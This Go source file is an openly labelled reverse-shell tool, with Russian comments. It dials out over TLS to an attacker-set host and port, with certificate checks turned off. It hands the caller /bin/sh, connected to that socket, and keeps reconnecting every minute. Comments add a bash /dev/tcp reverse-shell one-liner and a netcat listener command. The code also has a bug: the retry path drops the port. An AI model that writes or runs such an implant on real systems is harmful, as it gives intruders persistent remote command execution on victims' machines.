// Reverse Shell in Go
// http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
// Test with nc -lvvp 12345
package main

import (
	"crypto/tls"
	"log"
	"net"
	"os/exec"
	"time"
)

var hostPort string

func main() {
	reverse(hostPort)
}

// bash -i >& /dev/tcp/localhost/12345 0>&1
func reverse(hostRaw string) {
	host, port, err := net.SplitHostPort(hostRaw)

	// читаем ключ и сертификат
	cert, err := tls.LoadX509KeyPair("client.pem", "client.key")

	if err != nil {
		log.Fatal(err)
	}

	// создаем конфиг tls
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	c, err := tls.Dial("tcp", host+":"+port, &config)

	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute) // ждем минутку
		reverse(host)
	}

	// обработка комманды от сервера
	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	reverse(host)
}
